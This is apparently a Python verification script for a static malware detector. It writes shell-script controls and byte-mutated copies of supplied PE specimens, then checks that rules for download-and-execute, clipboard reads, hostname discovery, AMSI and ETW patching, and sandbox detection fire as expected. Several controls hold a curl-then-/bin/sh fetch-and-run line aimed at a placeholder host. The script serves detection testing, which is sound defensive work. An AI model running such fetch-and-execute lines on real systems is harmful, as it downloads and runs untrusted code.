"""Static controls only. Never execute a sample or fetch its URLs.

Usage: python3 verify.py ETW_MUTANT AMSI_MUTANT SHELL_SAMPLE SCRATCH_DIRECTORY
PE mutations retain the supplied specimen and change one gate relationship.
They are matcher controls, not recovered originals or new threat specimens.
"""
import hashlib
import json
import os
from pathlib import Path
import struct
import subprocess
import sys

ROOT = Path(__file__).resolve().parents[3]
etw, amsi, shell, output = map(Path, sys.argv[1:])
output.mkdir(parents=True, exist_ok=True)
expected_hashes = [
    '7d81af8efd7c021fc56d45e7b301973a555bd62ca34fc4205695125305bebdc8',
    '897896bc8bf8e836f0113870bcda70c0b4642fa130231e767e39bb95bfb836bb',
    '3b403ffa8a99de5226f7d84a1c315c3095e456fb439ddaa8e3b1bd181d19e856',
]
for path, sha in zip([etw, amsi, shell], expected_hashes):
    assert hashlib.sha256(path.read_bytes()).hexdigest() == sha
CHAIN = 'micro-behaviors/process/deploy/file-exec::shell-curl-variable-file-invocation'
SCRIPT = 'micro-behaviors/process/create/shell/script-file::shell-variable-script-file'
CLIP = 'micro-behaviors/os/clipboard/read::shell-pbpaste-read'
HOST = 'micro-behaviors/os/sysinfo/hostname::shell-scutil-computer-name'
TEMP = 'micro-behaviors/fs/temp/file::shell-mktemp-file-call'
GATE = 'objectives/anti-analysis/sandbox-detect/suite::x64-ram-screen-shared-abort'
AMSI_PATCH = 'objectives/evasion/anti-av/amsi::index-xor-amsi-invalidarg-patch'
ETW_PATCH = 'objectives/evasion/anti-av/blinding::index-xor-etw-zero-return-patch'
NEW = {CHAIN, SCRIPT, CLIP, HOST, TEMP, GATE}
cases = []


def script(name, body, present=()):
    path = output / (name + '.sh')
    path.write_text('#!/bin/sh\n' + body + '\n')
    cases.append((path, set(present), NEW - set(present)))


fetch = 'curl -fsSL https://downloads.example.invalid/helper -o "$download"\n'
launch = '/bin/sh "$download"'
script('same-variable', fetch + launch, [CHAIN, SCRIPT])
script('renamed-variable', (fetch + launch).replace('download', 'another_path'), [CHAIN, SCRIPT])
script('no-flags', fetch.replace(' -fsSL', '') + launch, [CHAIN, SCRIPT])
script('different-variable', fetch + '/bin/sh "$other"', [SCRIPT])
script('reassigned-variable', fetch + 'download=/usr/local/lib/local.sh\n' + launch, [SCRIPT])
script('opposite-branches', 'if test -f local; then\n' + fetch + 'else\n' + launch + '\nfi', [SCRIPT])
script('pipeline', fetch.rstrip() + ' | ' + launch, [SCRIPT])
script('fallback', fetch.rstrip() + ' || ' + launch, [SCRIPT])
script('comments', '# ' + fetch.replace('\n', '\n# ') + launch)
script('literal-dollar', fetch + "/bin/sh '$download'")
script('echo-launch', fetch + "printf '%s' '/bin/sh \"$download\"'")
script('shadow-curl', 'curl() { printf "%s" local; }\n' + fetch + launch, [SCRIPT])
script('local-url', fetch.replace('https://downloads.example.invalid/helper', 'file:///local/helper') + launch, [SCRIPT])
script('loop-body', 'while test -f continue; do\n' + fetch + launch + '\ndone', [CHAIN, SCRIPT])
script('function-body', 'install_helper() {\n' + fetch + launch + '\n}', [CHAIN, SCRIPT])
script('clipboard-command', 'selection=$(pbpaste)', [CLIP])
script('clipboard-literal', "printf '%s' 'pbpaste'")
script('clipboard-shadow', 'pbpaste() { printf local; }\nselection=$(pbpaste)')
script('hostname-command', 'computer=$(scutil --get ComputerName)', [HOST])
script('hostname-other-property', 'scutil --get LocalHostName')
script('hostname-set', 'scutil --set ComputerName newname')
script('hostname-shadow', 'scutil() { printf local; }\nscutil --get ComputerName')
script('temporary-file', 'staging=$(mktemp)', [TEMP])
script('temporary-directory', 'staging=$(mktemp -d)')
script('temporary-literal', "printf '%s' 'mktemp'")

cases.extend([(etw, {GATE, AMSI_PATCH}, {ETW_PATCH}),
              (amsi, {GATE, ETW_PATCH}, {AMSI_PATCH}),
              (shell, NEW - {GATE}, {GATE})])
original = etw.read_bytes()
ram = 0x170D1 - 0xC00
screen = 0x1712F - 0xC00
mutations = [
    ('ram-unrelated-field', ram + 58, 1),
    ('ram-wrong-import', ram + 47, 1),
    ('ram-other-abort', ram + 72, 1),
    ('width-other-abort', screen + 29, 1),
    ('height-other-abort', screen + 40, 1),
    ('screen-wrong-import', screen + 4, 1),
]
for name, offset, mask in mutations:
    buf = bytearray(original)
    buf[offset] ^= mask
    path = output / (name + '.exe')
    path.write_bytes(buf)
    cases.append((path, {AMSI_PATCH}, {GATE, ETW_PATCH}))
buf = bytearray(original)
struct.pack_into('<I', buf, ram + 63, 0x40000000)
struct.pack_into('<I', buf, screen + 23, 1280)
struct.pack_into('<I', buf, screen + 34, 720)
path = output / 'different-resource-thresholds.exe'
path.write_bytes(buf)
cases.append((path, {GATE, AMSI_PATCH}, {ETW_PATCH}))

result = subprocess.run(
    [os.environ.get('CLEAVE', 'cleave'), '--traits-dir', str(ROOT), '--format', 'json',
     *[str(case[0]) for case in cases]], text=True, capture_output=True, check=True,
)
(output / 'controls.json').write_text(result.stdout)
(output / 'controls.log').write_text(result.stderr)
decoder = json.JSONDecoder()
remaining = result.stdout.strip()
files = {}
while remaining:
    report, end = decoder.raw_decode(remaining)
    files.update((f['path'], f) for f in report['files'])
    remaining = remaining[end:].strip()
checks = []
for path, present, absent in cases:
    actual = {t['id'] for t in files[str(path)].get('traits', [])}
    missing, unexpected = sorted(present - actual), sorted(absent & actual)
    checks.append({'name': path.name, 'missing': missing, 'unexpected': unexpected})
(output / 'checks.json').write_text(json.dumps(checks, indent=2) + '\n')
failures = [case for case in checks if case['missing'] or case['unexpected']]
assert not failures, failures
print(f'Passed {len(checks)} static specimen and boundary controls.')
